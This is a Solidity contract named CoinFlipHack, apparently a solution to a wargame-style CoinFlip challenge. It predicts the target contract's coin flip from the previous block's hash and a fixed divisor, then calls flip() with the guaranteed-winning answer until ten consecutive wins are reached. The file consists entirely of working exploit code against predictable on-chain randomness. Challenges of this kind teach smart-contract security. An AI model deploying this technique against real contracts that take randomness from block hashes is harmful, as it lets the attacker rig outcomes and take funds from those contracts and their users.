pragma solidity >=0.5.0 <0.7.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipHack {
    uint256 HACKFACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cp;
    uint256 public prevBlock;

    constructor(address deployedAddress) public payable {
        cp = CoinFlip(deployedAddress);
    }

    function getBlockMinusOne() public view returns (uint256) {
        return (block.number - 1);
    }

    function getWins() public view returns (uint256) {
        return cp.consecutiveWins();
    }

    /**
        @dev Repeatedly deploy this method to hack the contract
        until consecutive wins is equal to 10.
     */
    function checkBlock() public returns (bool) {
        if (getBlockMinusOne() != prevBlock) {
            prevBlock = getBlockMinusOne();
            _initHack();
        }
    }

    function _initHack() private returns (bool) {
        uint256 currentHash = uint256(blockhash(prevBlock));
        uint256 coinFlipNow = currentHash / HACKFACTOR;
        bool flipResult = coinFlipNow == 1 ? true : false;
        cp.flip.gas(1000000)(flipResult);
        return true;
    }

    function getBalance() public view returns(uint){
      return address(this).balance;
    }

}
